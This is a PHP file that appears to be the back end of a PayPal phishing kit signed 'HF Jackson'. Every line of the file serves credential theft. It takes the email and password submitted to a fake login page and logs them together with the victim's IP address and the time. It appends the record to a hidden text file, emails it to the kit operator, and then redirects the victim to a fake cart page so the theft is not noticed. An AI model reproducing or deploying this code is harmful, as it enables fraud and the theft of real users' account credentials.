<?php
session_start();

include './email.php';

if(isset($_POST['email'])){

if(!empty($_POST['email'])){

$email    = $_POST['email'];

$pass    =  $_POST['pass'];

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$HF = "HF Jackson";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " PayPal Login -  By HF Jackson [ " .$ip. " - " .$HF. " ] ";
$headers .= "From: HF Jackson" . "\r\n";

$message = "


E-MAIL          =>   ".$email."
PASSWORD        =>   ".$pass."
IP              =>  "."http://www.geoiptool.com/?IP=".$ip."
TIME            =>   ".$time."

";

$txt = fopen('../../rezlta.txt', 'a');
fwrite($txt, $message);
fclose($txt);

mail($yourmail, $subject, $message , $headers);

header("location:../cart.php?websrc=".md5('X-HF Jackson')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");


 	}else{header("Location: ../login.php");}

}else{header("Location: ../login.php");}